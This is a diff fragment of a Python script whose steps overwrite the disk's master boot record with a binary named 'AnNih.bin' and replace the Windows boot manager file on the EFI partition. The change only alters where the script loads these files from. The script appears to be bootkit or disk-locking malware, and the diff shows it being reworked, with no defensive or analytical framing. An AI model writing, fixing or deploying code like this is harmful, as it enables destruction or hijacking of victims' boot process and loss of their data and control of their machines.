@@ -137,7 +137,11 @@ def overwrite_mbr(bin_file_path):
 # Function to copy bootmgfw.efi to the desired location
 def copy_bootmgfw_efi():
     try:
-        source_path = r"C:\Windows\SystemUpdateResources\bootmgfw.efi"
+        # Get the current working directory
+        script_dir = os.getcwd()
+
+        # Define the source path of bootmgfw.efi
+        source_path = os.path.join(script_dir, "bootmgfw.efi")
         destination_path = r"X:\EFI\Microsoft\Boot\bootmgfw.efi"
 
         # Check if the source file exists
@@ -196,7 +200,7 @@ def main():
 
         # Step 4: Overwrite MBR with AnNih.bin
         print("Overwriting MBR...")
-        overwrite_mbr("AnNih.bin")  # Specify the path to your AnNih.bin
+        overwrite_mbr(os.path.join(os.getcwd(), "AnNih.bin"))
 
         # Step 5: Copy bootmgfw.efi
         print("Copying bootmgfw.efi...")
